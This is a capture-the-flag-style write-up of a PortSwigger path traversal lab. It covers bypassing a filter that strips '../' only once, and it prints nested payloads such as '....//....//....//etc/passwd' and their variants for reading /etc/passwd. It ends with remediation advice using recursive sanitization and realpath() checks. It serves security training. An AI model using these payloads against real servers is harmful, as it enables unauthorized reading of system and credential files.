# Lab 03 — Sequences stripped non-recursively

**Difficulty:** 🟡 Practitioner  
**Technique:** Path Traversal — non-recursive strip bypass  
**Link:** https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

---

## Concept

The application strips `../` from user input as a defense against path traversal. However, the sanitization is applied only once (non-recursively). By nesting the traversal sequence inside itself, the filter removes the inner `../` and leaves a valid `../` behind.

---

## Reconnaissance

Same injection point:

```
GET /image?filename=18.jpg
```

Both `../../../etc/passwd` and `/etc/passwd` are blocked — the app strips traversal sequences and rejects absolute paths.

---

## Process

### Step 1 — Understand the filter behavior

The filter performs a single pass, replacing `../` with an empty string:

```
....// → (remove ../) → ../
```

The outer dots and slash survive because the filter already consumed the inner `../`.

### Step 2 — Build the nested payload

Three levels of traversal using nested sequences:

```
GET /image?filename=....//....//....//etc/passwd
```

After the filter processes it:

```
....//....//....//etc/passwd  →  ../../../etc/passwd
```

---

## Result

Full `/etc/passwd` contents returned with 200 OK.

---

## Variants

Other nested sequences that achieve the same result:

```
..././        →  ../
....\\        →  ..\   (Windows)
..%2F         →  ../   (URL encoded slash)
```

---

## Issues encountered

None. Once the non-recursive logic was understood, the payload was straightforward.

---

## Takeaways

- Non-recursive sanitization is bypassable with nested sequences
- The filter must loop until no further changes occur (recursive sanitization)
- The correct fix is to resolve the final path with `realpath()` and verify it starts within the allowed directory — regardless of what the raw input looked like

---

## References

- [Path Traversal — PortSwigger](https://portswigger.net/web-security/file-path-traversal)
